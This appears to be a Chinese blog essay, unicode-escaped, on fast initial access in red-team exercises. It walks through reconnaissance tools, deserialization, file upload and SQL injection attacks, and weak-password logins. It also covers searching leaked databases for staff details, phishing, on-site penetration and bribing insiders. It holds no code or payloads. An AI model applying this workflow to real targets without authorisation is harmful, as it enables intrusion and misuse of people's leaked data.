<p>\u6253\u70b9\u7684\u4e00\u822c\u76ee\u7684\u5728\u4e8e\u5229\u7528\u8fd9\u53f0\u673a\u5668\uff0c\u505a\u4e00\u4e2a\u8df3\u677f\uff0c\u7136\u540e\u8fdb\u5165\u5185\u7f51\u3002</p> <p>\u901a\u5e38\u7ed9\u4e88\u5145\u5206\u65f6\u95f4\u7684\u60c5\u51b5\u4e0b\uff0c\u6253\u70b9\u4e0d\u662f\u4e00\u4ef6\u5f88\u96be\u7684\u4e8b\u60c5\uff0c\u56e0\u4e3a\u7cfb\u7edf\u603b\u4f1a\u6709\u6f0f\u6d1e\uff0c\u5c31\u7b97\u7cfb\u7edf\u6ca1\u6709\u6f0f \u6d1e\uff0c\u4eba\u4e5f\u6709\u6f0f\u6d1e\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u9493\u9c7c\uff0c\u751a\u81f3\u8fd8\u53ef\u4ee5\u8fd1\u6e90\uff0c\u53ef\u4ee5\u82b1\u94b1\u4e70\u5185\u9b3c\uff0c\u4e00\u5207\u90fd\u53ea\u662f\u6253\u70b9\u7684\u65f6\u95f4\u548c \u4ef7\u683c\u6210\u672c\u4e0e\u6253\u5230\u70b9\u8fdb\u5185\u7f51\u7684\u6536\u76ca\u7684\u6838\u7b97\u95ee\u9898\uff0c\u672c\u8d28\u5176\u5b9e\u5c31\u662f\u4e00\u9053\u6570\u5b66\u9898\u3002</p> <p>\u4f46\u662f\u4ee5\u5728\u516c\u53f8\u5e72\u6d3b\u7684\u666e\u901a\u5458\u5de5\u89c6\u89d2\u51fa\u53d1\uff0c\u4e00\u822c\u9879\u76ee\u65f6\u95f4\u5f88\u7d27\uff0c\u540c\u65f6\u5916\u90e8\u8d44\u6e90\u5c11\uff0c\u57fa\u672c\u80fd\u7528\u7684\u4e1c\u897f\u5c31\u662f\u81ea\u5df1\u7684\u6280\u672f\u3002\u5bf9\u4e2a\u4f53\u800c\u8a00\uff0c\u8fd9\u79cd\u6761\u4ef6\u4e0b\uff0c\u4e2a\u4eba\u6280\u672f\u6210\u4e3a\u4e86\u4e3b\u5bfc\u56e0\u7d20\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a\u7ea2\u961f\u4eba\u5458\u5feb\u901f\u6253\u70b9\u80fd\u529b\u7684\u5f3a\u608d\u4e0e\u5426\uff0c\u6210\u4e3a\u4e86\u4e00\u4e2a\u666e\u901a\u7ea2\u961f\u548c\u4f18\u79c0\u7ea2\u961f\u7684\u5dee\u522b\u6240\u5728\u3002</p> <p>\u5f53\u7136\uff0c\u8fd9\u91cc\u53ef\u80fd\u6709\u4eba\u4f1a\u8bb2\uff0c\u90a3\u4e48\u6709\u7684\u5730\u65b9\u53ef\u4ee5\u7ed9\u5f88\u591a\u65f6\u95f4\uff0c\u6216\u8005\u8bf4\u81ea\u5df1\u5728\u5b9e\u6218\u4e2d\u5728\u641e\u522b\u7684\u7ad9\u7684\u65f6\u5019\uff0c\u4e0d\u662f\u7279\u5b9a\u9879\u76ee\u4e2d\u662f\u6709\u5927\u628a\u65f6\u95f4\u6765\u8fdb\u884c\u6e17\u900f\u548c\u653b\u51fb\u7684\uff0c\u53ef\u4ee5\u6162\u6162\u641e\u3002</p> <p>\u4e3b\u6d41\u7684ctf\u8d5b\u4e8b\u89e3\u9898\u65f6\u95f4\u4e5f\u53ea\u67091-2\u5929\uff0c\u5f88\u591a\u653b\u9632\u9879\u76ee\u4e5f\u5c31\u662f\u4e00\u5468\u65f6\u95f4\uff0csrc\u4e2d\u7b2c\u4e00\u4e2a\u6316\u5230\u6d1e\u7684\u624d\u7ed9 \u94b1\uff0c\u8fd9\u662f\u5ba2\u89c2\u6761\u4ef6\uff0c\u5bf9\u5927\u5bb6\u90fd\u662f\u5e73\u7b49\u7684\u3002 \u9879\u76ee\u5c31\u53ea\u6709\u51e0\u5929\uff0c\u8fd9\u5c31\u662f\u6e38\u620f\u89c4\u5219\uff0c\u662f\u6ca1\u6709\u9053\u7406\u53ef\u8bb2\u7684\uff0c\u6240\u4ee5\u8fd8\u662f\u4e0d\u8981\u627e\u7406\u7531\u4e86\uff0c\u56e0\u4e3a\u4e5f\u6ca1\u5565\u7528\u3002\u5f53\u7136\uff0c\u4ece\u516c\u53f8\u7684\u89d2\u5ea6\u51fa\u53d1\uff0c\u56e0\u4e3a\u9879\u76ee\u65f6\u95f4\u7d27\uff0c\u800c\u5f88\u5927\u7a0b\u5ea6\u4e0a\uff0c\u6253\u70b9\u53c8\u662f\u4e2a\u4f53\u529b\u6d3b\uff0c\u4e0d\u6d89\u53ca\u592a\u591a\u6280\u672f\uff0c\u6240\u4ee5\u6295\u5165\u4fe1\u606f\u641c\u96c6\u7684\u4eba\u8d8a\u591a\uff0c\u6548\u679c\u4e00\u822c\u662f\u66f4\u52a0\u597d\u7684\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u6253\u70b9\u672c\u8eab\u5c31\u662f\u4e00\u79cd\u904d\u5386\u884c\u4e3a\uff0c\u88ab\u653b\u51fb\u7684\u76ee\u6807\u5c31\u597d\u50cf\u4e00\u4e2a\u88ab\u56f4\u5899\u4fdd\u62a4\u7684\u57ce\u5821\uff0c\u7ea2\u961f\u8981\u505a\u7684\u4e8b\u60c5\u5c31\u662f\u56f4\u7740\u56f4\u5899\u8f6c\u6765\u8f6c\u53bb\uff0c\u6572\u6572\u6253\u6253\uff0c\u770b\u770b\u56f4\u5899\u54ea\u91cc\u6ca1\u4fee\u597d\uff0c\u54ea\u91cc\u7a7a\u4e86\u4e00\u5757\uff0c\u7136\u540e\u8d81\u673a\u6e9c\u8fdb\u53bb\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f53\u529b\u52b3\u52a8\uff0c\u5c24\u5176\u5728\u9762\u5bf9\u5f88\u591a\u76ee\u6807\u7684\u65f6\u5019\uff0c\u662f\u4e00\u9879\u7e41\u91cd\u7684\u4f53\u529b\u52b3\u52a8\uff0c\u5728\u4e0b\u6587\u4e2d\u4f1a\u8be6\u7ec6\u89e3\u91ca\u4e3a\u4ec0\u4e48\u6211\u53cd\u590d\u5f3a\u8c03\u8fd9\u662f\u4e00\u9879\u4f53\u529b\u52b3\u52a8\u3002</p> <p>\u4e8c\u3001\u6253\u70b9\u7684\u57fa\u672c\u65b9\u6cd5</p> <p>\u57fa\u672c\u65b9\u6cd5\uff0c\u65e0\u975e\u5c31\u662f\u4fe1\u606f\u641c\u96c6--&gt;\u627e\u5230\u8106\u5f31\u8d44\u4ea7--&gt;\u6f0f\u6d1e\u5229\u7528--&gt;getshell\uff0c\u8bf4\u8d77\u6765\u662f\u5f88\u7b80\u5355\u7684\u3002</p> <p>\u8fd9\u5176\u4e2d\u6700\u809d\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u83ab\u8fc7\u4e8e\u4fe1\u606f\u641c\u96c6\u4e86\u90a3\u5c5e\u4e8e\u662f\u7eaf\u4f53\u529b\u6d3b\u3002\u5f53\u7136\uff0c\u8fc7\u7a0b\u53ef\u4ee5\u7528\u5de5\u5177\u76f8\u5bf9\u4f18\u5316\uff0c\u4f46\u6211\u4f9d\u65e7\u8ba4\u4e3a\u662f\u6700\u65e0\u8111\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u5c31\u50cf\u5927\u5b66\u751f\u548c\u5c0f\u5b66\u751f\uff08\u9ad8\u9636\u548c\u4f4e\u9636\u6280\u672f\u4eba\u5458\uff09\u4e00\u8d77\u7528\u8ba1\u7b97\u5668\uff08\u5404\u79cd\u5de5\u5177 fofa goby oneforall\u7b49\uff09\u6765\u7b971w\u9053\u52a0\u51cf\u4e58\u9664\u9898\uff08\u5927\u91cf\u7684\u8d44\u4ea7 \u57df\u540d\u5b50\u57df\u540d c\u6bb5\u7b49\uff09\u4e00\u6837\uff0c\u5176\u5b9e\u662f\u533a\u5206\u4e0d\u5f00\u6280\u672f\u4eba\u5458\u7684\u6c34\u5e73\u7684\uff0c\u5f88\u591a\u5934\u90e8\u7684\u516c\u53f8\u65e9\u5c31\u8ba4\u8bc6\u5230\u4e86\u8fd9\u4e00\u70b9\uff0c\u4e8e\u662f\u5728\u5927\u578b\u653b\u9632\u6f14\u7ec3\u4e2d\uff0c\u901a\u5e38\u662f\u6d3e\u5927\u91cf\u7684\u4eba\u6765\u8fdb\u884c\u8d44\u4ea7\u6536\u96c6\uff0c\u7136\u540e\u7b5b\u9009\u51fa\u5176\u4e2d\u7684\u8106\u5f31\u8d44\u4ea7\u540e\u628a\u8d44\u4ea7\u7ed9\u540e\u7eed\u7684\u5229\u7528\u4eba\u5458\u6765\u8fdb\u5185\u7f51\u5feb\u901f\u62ff\u5206\u3002</p> <p>\u867d\u7136\u4fe1\u606f\u641c\u96c6\u5f88\u65e0\u8111\uff0c\u4f46\u662f\u8be5\u8bf4\u8fd8\u662f\u5f97\u8bf4\uff0c\u8fd9\u4e2a\u4e8b\u60c5\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\u3002</p> <p>1\u3001\u5f53\u9879\u76ee\u7ecf\u7406\u544a\u8bc9\u4e86\u4f60\u653b\u51fb\u76ee\u6807\u7684\u65f6\u5019 \u2192\u5f97\u5230\u516c\u53f8\u540d\u2192\u4e0a\u4f01\u67e5\u67e5\u641c\u516c\u53f8\u540d\u2192\u641c\u51fa\u6765\u4e00\u5806\u516c\u53f8\u548c\u5b50\u516c\u53f8</p> <p>2\u3001\u62ff\u5230\u8fd9\u5806\u516c\u53f8\u548c\u5b50\u516c\u53f8\u7684\u540d\u5b57\u2192oneforall\u6765\u8dd1\u4e00\u904d\u2192\u7136\u540e\u5f97\u5230\u4e86\u4e00\u5806\u5b50\u57df\u540d</p> <p>3\u3001\u62ff\u5230\u8fd9\u5806\u5b50\u57df\u540d\u4e22\u7ed9Eeyes\u8dd1\u4e00\u904d\u2192\u5f97\u5230\u5bf9\u5e94\u5b50\u57df\u540d\u5bf9\u5e94\u7684ip\u548cc\u6bb5\u4fe1\u606f</p> <p>4\u3001\u5c06\u5bf9\u5e94ip\u548cc\u6bb5\u4e22\u7ed9fofa\u548cfscan\u2192fofa\u80fd\u5feb\u901f\u5f97\u5230c\u6bb5\u8d44\u4ea7\u4fe1\u606f\uff0cfscan\u80fd\u5feb\u901f\u626b\u4e00\u904d\uff0c\u987a\u4fbf\u5e2e \u4f60\u6253\u4e00\u4e0b\u5e38\u7528\u6f0f\u6d1e</p> <p>5\u3001\u5982\u679c\u4f60\u7684\u8fd0\u6c14\u8db3\u591f\u597d\uff0c\u8fd9\u4e2a\u65f6\u5019fscan\u5df2\u7ecf\u6709\u6f0f\u6d1e\u7206\u51fa\u6765\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u53bb\u5229\u7528\u4e86\uff08\u5c0f\u6982\u7387\u4e8b \u4ef6\uff09\uff0c\u4f46\u662f\u5982\u679c\u4f60\u7684\u8fd0\u6c14\u4e0d\u597d\uff0c\u5c31\u8981\u770b\u63a5\u4e0b\u6765\u7684\u7b2c6\u6b65</p> <p>6\u3001\u521a\u521afofa\u5f97\u5230\u7684\u8d44\u4ea7\u770b\u4e00\u773c\uff0c\u8fd9\u91cc\u53ef\u4ee5\u914d\u5408ehole\u7684\u6307\u7eb9\u8bc6\u522b\u6765\u5e2e\u52a9\u5feb\u901f\u7b5b\u9009\uff0c\u901a\u8fc7\u7b5b\u9009\u654f\u611f\u8d44\u4ea7\uff0c\u4f8b\u5982shiro\uff0cfastjson\u7b49\u76f4\u63a5\u80fd\u591f\u53cd\u5e8f\u5217\u5316getshell\u7684\u8d44\u4ea7\uff08\u5c0f\u6982\u7387\u4e8b\u4ef6\uff09\uff0c\u5982\u679c\u4f60\u7684\u8fd0\u6c14\u597d\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u6709\u6f0f\u6d1e\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u4e86\uff0c\u5982\u679c\u4f60\u7684\u8fd0\u6c14\u4e0d\u597d\uff0c\u5c31\u8981\u770b\u63a5\u4e0b\u6765\u7684\u7b2c7\u6b65</p> <p>7\u3001\u901a\u8fc7\u4e0a\u9762\u4e00\u756a\u7b5b\u9009\uff0c\u65f6\u95f4\u5df2\u7ecf\u8fc7\u53bb\u5f88\u4e45\u4e86\uff0c\u4f46\u662f\u76ee\u524d\u5374\u6beb\u65e0\u8fdb\u5c55\uff0c\u5176\u5b9e\u5fc3\u91cc\u6709\u70b9\u90c1\u95f7\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u4e0d\u5efa\u8bae\u518d\u641e\u4e86\uff0c\u5148\u4f11\u606f\u4e00\u4e0b\uff0c\u8c03\u6574\u4e0b\u5fc3\u6001\uff0c\u4e0d\u7136\u540e\u7eed\u7684\u51e0\u5929\u4f1a\u5927\u5e45\u5ea6\u964d\u4f4e\u5de5\u4f5c\u6548\u7387\uff0c\u4f11\u606f\u597d\u4e86\u611f\u89c9\u53c8\u53ef\u4ee5\u4e86\uff0c\u5c31\u770b\u770b\u4e0b\u9762\u7684\u6b65\u9aa48\u7ee7\u7eed\u5427</p> <p>8\u3001\u5176\u5b9e\u7ecf\u8fc7\u4e0a\u9762\u7684\u4e00\u756a\u7b5b\u9009\uff0cweb\u8fd9\u5757\u7684\u57fa\u672c\u5df2\u7ecf\u8fc7\u5b8c\u4e86\uff0c\u4f46\u662f\u4f9d\u65e7\u8fd8\u6ca1\u6709\u6f0f\u6d1e\uff0c\u8bf4\u660e\u8fd9\u4e2a\u7cfb\u7edf\u5e73\u65f6\u81ea\u67e5\u641e\u7684\u6bd4\u8f83\u591a\uff0c\u57fa\u672c\u7684\u9ad8\u5371\u6f0f\u6d1e\u4fee\u590d\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u5982\u679c\u662f\u5927\u578b\u653b\u9632\u6f14\u7ec3\uff0c\u90a3\u5c31\u5efa\u8bae\u6362\u4e2a\u76ee\u6807\u518d\u7528\u4e0a\u9762\u7684\u65b9\u6cd5\u8f6e\u4e00\u6b21\uff0c\u5982\u679c\u662f\u5c31\u67d0\u5bb6\u5355\u4f4d\u505a\u7684\u5b9a\u5411\u653b\u9632\uff0c\u5c31\u7ee7\u7eed\u770b\u6b65\u9aa49\u5427</p> <p>9\u3001web\u7684\u8fc7\u5b8c\u4e86\uff0c\u867d\u7136\u6ca1\u6709\u76f4\u63a5\u80fd\u591frce\u7684\u7cfb\u7edf\uff0c\u4f46\u662f\u6211\u4eec\u83b7\u5f97\u4e86\u5f88\u591a\u5f62\u5f62\u8272\u8272\u7684\u767b\u5f55\u540e\u53f0\\\u7528\u6237\u767b\u5f55\\\u6ce8\u518c\\\u7ba1\u7406\u5458\u767b\u5f55\u7b49\u7b49\u7b49\u7b49\u4ea4\u4e92\u7c7b\u578b\u7684\u8d44\u4ea7\uff0c\u8fd9\u4e9b\u8d44\u4ea7\u867d\u7136\u770b\u8d77\u6765\u6ca1\u7528\uff0c\u4f46\u662f\u6211\u8fd9\u91cc\u8981\u4ecb\u7ecd\u4e00\u4e0b\u653b\u9632\u6f14\u7ec3\u7684\u4e09\u677f\u65a7\u6f0f\u6d1e\uff0c\u8fd0\u6c14\u597d\u7684\u8bdd\uff0c\u8fd9\u4e9b\u8d44\u4ea7\u8fd8\u662f\u80fd\u591f\u6d3e\u4e0a\u7528\u573a\u7684</p> <p>\u4e09\u677f\u65a7\u5176\u4e00 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff1a\u8fd9\u4e2a\u4e0d\u7528\u591a\u8bf4\uff0c\u53ea\u8981\u6709\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u57fa\u672c\u4e00\u53f0\u673a\u5b50\u7684shell\u5c31\u62ff\u5230\u4e86\uff0c\u770b\u5230\u5c31\u773c\u775b\u653e\u5149\uff0c\u4f46\u662f\u53ef\u9047\u4e0d\u53ef\u6c42\uff0c\u904d\u5730\u90fd\u662fshiro\u7684\u65f6\u4ee3\u5df2\u7ecf\u6e10\u6e10\u8fc7\u53bb\u4e86\u3002</p> <p>\u4e09\u677f\u65a7\u5176\u4e8c \u6587\u4ef6\u4e0a\u4f20\uff1a\u8fd9\u4e2a\u4e5f\u662f\u8001\u719f\u4eba\u4e86\uff0c\u4e00\u822c\u4f1a\u5148\u770b\u770b\u662f\u4e0d\u662f\u767d\u540d\u5355\uff0c\u662f\u767d\u540d\u5355\u7684\u8bdd\uff0c\u5c31\u770b\u770b\u6709\u6ca1\u6709\u6587\u4ef6\u5305\u542b\u4e4b\u7c7b\u7684\u6f0f\u6d1e\u80fd\u7ec4\u5408\u5229\u7528\u4e0b\uff0c\u5982\u679c\u662f\u9ed1\u540d\u5355\uff0c\u5c31\u628a\u6587\u4ef6\u4e0a\u4f20\u7684\u59ff\u52bf\u5bf9\u7740\u4e0a\u4f20\u70b9\u5168\u90e8\u6765\u4e00\u904d\uff0c\u770b\u770b\u6709\u6ca1\u6709\u4e00\u4e2a\u80fd\u4e2d\uff0c\u5982\u679c\u80fd\u4e2d\uff0c\u90a3\u5c31\u6709\u4e86\u4e00\u4e2ashell\uff08\u6ca1\u8def\u5f84\u8fde\u4e0d\u4e0a\u4f46\u662f\u786e\u5b9e\u662fshell\uff09\uff0c\u867d\u7136\u627e\u4e0a\u4f20\u8def\u5f84\u4e5f\u662f\u4e00\u4e2a\u62e6\u8def\u864e\uff0c\u4f46\u662f\u81f3\u5c11\u6bd4\u4f20\u4e0d\u4e0a\u53bb\u5f3a\u3002</p> <p>\u4e09\u677f\u65a7\u5176\u4e09 sql\u6ce8\u5165\uff1a\u8fd9\u4e2a\u66f4\u52a0\u8001\u719f\u4eba\u4e86\uff0c\u6ce8\u5165\u4e4b\u540e\uff0c\u4f4e\u6743\u9650\uff0c\u76f4\u63a5gg\uff0c\u9ad8\u6743\u9650\uff0c\u8bd5\u8bd5\u5427\uff0c\u770b\u80fd\u4e0d\u80fd\u4e0ashell\u3002</p> <p>\u81f3\u4e8e\u5176\u4ed6\u6f0f\u6d1e\uff0c\u653b\u9632\u6f14\u7ec3\u5c31\u90a3\u4e48\u51e0\u5929\u65f6\u95f4\uff0c\u516b\u6210\u662f\u7528\u4e0d\u4e0a\uff0c\u5efa\u8bae\u76f4\u63a5\u653e\u5f03\uff0c\u5c31\u628a\u4e0a\u9762\u4e09\u4e2a\u73a9\u7cbe\uff08\u4ec5\u4ec5\u5c31\u653b\u9632\u9879\u76ee\u6765\u8bf4\uff09\u3002</p> <p>10\u3001\u5bf9\u5404\u79cd\u767b\u5f55\u7cfb\u7edf\u5c1d\u8bd5\u5f31\u53e3\u4ee4/sql\u6ce8\u5165\u653b\u51fb\uff0c\u5f31\u53e3\u4ee4\u80fd\u767b\u8fdb\u53bb\u540e\u53f0\u5c31\u627e\u4e0a\u4f20\u70b9\uff0csql\u6ce8\u5165\u5efa\u8bae xray+burp\u6765\u6d4b\uff0c\u770b\u5230\u6709\u620f\u7684\u518d\u4e0asqlmap\u3002</p> <p>\u8fd8\u6709\u4e00\u4e9b\u4fe1\u606f\u641c\u96c6\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982fofa\u641c\u5173\u952e\u5b57\uff0ctitle=\"\u5355\u4f4d\u540d\"\u7b49\uff0c\u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u81ea\u884c\u7a7f\u63d2\u7075\u6d3b\u4f7f \u7528\uff0c\u6709\u65f6\u5019\u6709\u5947\u6548\uff0c\u6709\u65f6\u5019\u6ca1\u5565\u6548\u679c\uff0c\u770b\u4e2a\u4eba\u9020\u5316\u4e86\u3002</p> <p>\u8fd8\u6709\u4e9b\u5929\u9009\u4e4b\u4eba\uff0c\u76f4\u63a5\u4e00\u4e2a\u5f31\u53e3\u4ee4\u767b\u4e91\u684c\u9762\uff08horizon\u3001vdi\u7b49\uff09\u7136\u540e\u62ffshell\u7684\uff0c\u8fd9\u79cd\u5c5e\u4e8e\u5929\u8d50 shell\uff0c\u4e0d\u5728\u5e38\u89c4\u8003\u8651\u8303\u56f4\u4e4b\u5185\uff0c\u4f46\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u3002</p> <p>11\u3001\u5f31\u53e3\u4ee4\u5982\u679c\u7206\u4e0d\u51fa\u8d26\u53f7\u5bc6\u7801\uff0c\u5c31\u8003\u8651\u4e0a\u7f51\u76d8\\github\\sgk\\\u6cc4\u9732\u516c\u5f00\u5e93\u641c\u5bf9\u5e94\u4eba\u5458\u7684\u4fe1\u606f\uff0c\u770b \u770b\u6709\u6ca1\u6709\u7528</p> <p>12\u3001\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u7528\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u770b\u516c\u4f17\u53f7\\app\\\u5c0f\u7a0b\u5e8f\u7684\u4fe1\u606f</p> <p>13\u3001\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u7528\uff0c\u5c31\u8981\u5f00\u59cb\u7528\u57df\u4f20\u9001\\\u5907\u6848\u53f7\\ip\u53cd\u67e5\u7f51\u7ad9\\ssl\u8bc1\u4e66\\\u7528google\u6765\u641cc\u6bb5</p> <p>14\u3001\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u7528\uff0c\u5c31\u7528dirmap\\dirsearch\u6765\u5bf9\u53ef\u7591\u7684\u7f51\u7ad9\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u770b\u770b\u6709\u6ca1\u6709\u7528</p> <p>15\u3001\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u7528\uff0c\u8fd8\u53ef\u4ee5\u9493\u9c7c\uff0c\u53d1\u90ae\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4f53\u529b\u6d3b</p> <p>16\u3001\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u7528\uff0c\u62ff\u4e0a\u8bbe\u5907\u8ddf\u9886\u5bfc\u7533\u8bf7\u8fd1\u6e90\u6e17\u900f\u5427</p> <p>\u5217\u4e86\u8fd9\u4e48\u591a\uff0c\u5c31\u662f\u60f3\u8bf4\u660e\u4e00\u70b9\uff0c\u867d\u7136\u4fe1\u606f\u641c\u96c6\u662f\u4e00\u9879\u5f88\u91cd\u8981\u7684\u5de5\u4f5c\uff0c\u662f\u5f00\u542f\u540e\u6e17\u900f\u7684\u57fa\u7840\uff0c\u4f46\u8fd9\u9879\u5de5\u4f5c\u662f\u4f53\u529b\u6d3b\u771f\u7684\u662f\u4e0d\u4e89\u7684\u4e8b\u5b9e\uff0c\u56e0\u4e3a\u4ed6\u6ca1\u6709\u95e8\u69db\uff0c\u57fa\u672c\u8c01\u90fd\u80fd\u505a\uff0c\u65e0\u975e\u5c31\u662f\u7528\u5de5\u5177\u5bf9\u7740\u4e00\u9879\u9879checklist\u4e0d\u65ad\u7684\u53bb\u5c1d\u8bd5\u800c\u5df2\u3002</p> <p>\u56e0\u6b64\u901a\u5e38\u610f\u4e49\u4e0a\u7684\u5feb\u901f\u6253\u70b9\uff0c\u5c31\u662f\u6bd4\u8c01\u5148\u8bd5\u5b8c\u6240\u6709\u7684checklist\uff0c\u867d\u7136\u76ee\u524d\u7edd\u5927\u90e8\u5206\u5de5\u4f5c\u90fd\u662f\u7531\u5de5\u5177\u6765\u5b8c\u6210\uff0c\u6574\u4e2a\u9879\u76ee\u5448\u4e00\u4e2a\u534a\u81ea\u52a8\u5316\u7684\u6d41\u7a0b\uff0c\u4f46\u662f\u4ecd\u7136\u67b6\u4e0d\u4f4f\u8d44\u4ea7\u91cf\u7684\u5e9e\u5927\uff0c\u4e00\u4e2a\u4fe1\u606f\u6536\u96c6\u719f\u7ec3\u7684\u4eba\u65e0\u975e\u4e5f\u5c31\u662f\u6d41\u6c34\u7ebf\u7684\u5de5\u4eba\u800c\u5df2\uff0c\u5bf9\u7740\u5de8\u91cf\u7684\u8d44\u4ea7\u4e0d\u65ad\u7684\u7528\u5de5\u5177\u7b5b\u9009\u800c\u5df2\u3002</p> <p>\u800c\u4e00\u4e9b\u9ad8\u7aef\u6253\u70b9\u6280\u5de7\u73a9\u5f97\u597d\u7684\u4eba\uff0c\u4f8b\u5982\u7535\u8bdd\u9493\u9c7c\u6210\u529f\u7387\u5f88\u5927\u7684\u4eba\uff0c\u9493\u9c7c\u90ae\u4ef6\u7684\u64b0\u5199\u548c\u9493\u9c7c\u6837\u672c\u7684\u5f00\u53d1\u505a\u7684\u5f88\u725b\u7684\u4eba\uff0c\u5728\u505a\u8fd9\u4e9b\u4e8b\u60c5\u4e4b\u524d\u540c\u6837\u9700\u8981\u4fe1\u606f\u641c\u96c6\uff0c\u800c\u80fd\u591f\u73a9\u9ad8\u7aef\u6280\u5de7\u7684\u4eba\u662f\u4e0d\u613f\u610f\u6765\u505a\u4fe1\u606f\u641c\u96c6\u7684\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e5f\u662f\u4ece\u5c0f\u767d\u9636\u6bb5\u8fc7\u6765\u7684\uff0c\u660e\u767d\u4fe1\u606f\u641c\u96c6\u8fd9\u9879\u7e41\u91cd\u4e14\u6280\u672f\u542b\u91cf\u4f4e\u7684\u5de5\u4f5c\u5b8c\u5168\u53ef\u4ee5\u627e\u522b\u4eba\u6765\u505a\u3002</p> <p>\u4ece\u516c\u53f8\u5c42\u9762\u4e0a\u6765\u8bb2\uff0c\u8981\u5feb\u901f\u6253\u70b9\uff0c\u5c31\u8981\u6295\u5165\u66f4\u591a\u7684\u4eba\u3002\u4ece\u4e2a\u4eba\u5c42\u9762\u4e0a\u6765\u8bb2\uff0c\u8981\u5feb\u901f\u6253\u70b9\uff0c\u8981\u5fcd\u53d7\u67af\u71e5\u7684\u6253\u70b9\u8fc7\u7a0b\uff0c\u7136\u540e\u63d0\u5347\u81ea\u5df1\u7684\u5de5\u5177\u4f7f\u7528\u901f\u5ea6\uff0c\u6700\u597d\u81ea\u5df1\u80fd\u591f\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\uff0c\u628a\u4e00\u4e9b\u534a\u81ea\u52a8\u5316\u7684\u6b65\u9aa4\u8fde\u63a5\u8d77\u6765\uff0c\u4f18\u5316\u73b0\u6709\u7684\u6b65\u9aa4\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u63d0\u5347\u6548\u7387\u3002</p> <p>\u4e09\u3001\u6253\u70b9\u7684\u6280\u672f\u533a\u5206\u7ebf</p> <p>\u5f88\u591a\u65f6\u5019\uff0c\u627e\u5230\u4e86\u4e00\u4e2a\u8106\u5f31\u8d44\u4ea7\uff0c\u81ea\u5df1\u6ca1\u5229\u7528\u6210\u529f\uff0c\u522b\u4eba\u5229\u7528\u6210\u529f\u4e86\uff0c\u8fd9\u662f\u5f88\u666e\u904d\u7684\u73b0\u8c61\u3002</p> <p>\u8fd9\u5c31\u6765\u5230\u4e86\u6253\u70b9\u7684\u533a\u5206\u7ebf\uff0c\u4e5f\u5c31\u662f\u6f0f\u6d1e\u5229\u7528\u4e0a\u3002</p> <p>\u5229\u7528\u4e0d\u6210\u529f\u6709\u5f88\u591a\u7684\u539f\u56e0\uff0c\u6bd4\u5982\u4e00\u53f0\u673a\u5668\u660e\u660e\u51fa\u7f51\uff0c\u4f46\u662f\u53cd\u5f39shell\u600e\u4e48\u90fd\u5f39\u4e0d\u56de\u6765\u3002</p> <p>\u6bd4\u5982\u4e00\u53f0\u673a\u5668\u80fd\u591f\u53cd\u5f39shell\uff0c\u4f46\u662f\u65f6\u4e0d\u65f6\u5c31\u4f1a\u65ad\u5f00\u3002</p> <p>\u6bd4\u5982\u4e00\u53f0\u673a\u5668\u80fd\u591f\u5199\u5165\u4e00\u4e2a\u5185\u5b58\u9a6c\uff0c\u4e5f\u80fd\u591f\u8fde\u63a5\u4e0a\uff0c\u4f46\u662f\u4e00\u65e6\u4e0b\u8f7d\u6216\u8005\u4e0a\u4f20\u4e00\u4e9b\u8f83\u5927\u7684\u6587\u4ef6\uff0c\u5c31\u4f1a \u5931\u8d25\u3002</p> <p>\u6bd4\u5982\u4e00\u53f0\u673a\u5668\uff0c\u4ed6\u80fd\u591f\u6267\u884c\u547d\u4ee4\uff0c\u4e5f\u80fd\u53cd\u5f39shell\uff0c\u8fde\u63a5\u4e5f\u7a33\u5b9a\uff0c\u4f46\u662f\u6267\u884c\u7279\u5b9a\u7684\u547d\u4ee4\uff0c\u5c31\u4f1a\u5931 \u8d25\u3002</p> <p>\u8fd9\u4e2a\u65f6\u5019\uff0c\u4e00\u4e2a\u6280\u672f\u4eba\u5458\u5c31\u8131\u79bb\u4e86\u82e6\u529b\u52b3\u52a8\u7684\u9636\u6bb5\uff0c\u8fdb\u5165\u5230\u4e86\u533a\u5206\u6280\u672f\u7684\u65f6\u5019\u4e86\u3002</p> <p>\u533a\u5206\u4e00\u9879\u5de5\u4f5c\u662f\u82e6\u529b\u52b3\u52a8\u8fd8\u662f\u6280\u672f\u6d3b\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u770b\u662f\u4e0d\u662f\u8c01\u90fd\u80fd\u505a\u5c31\u884c\u4e86\u3002</p> 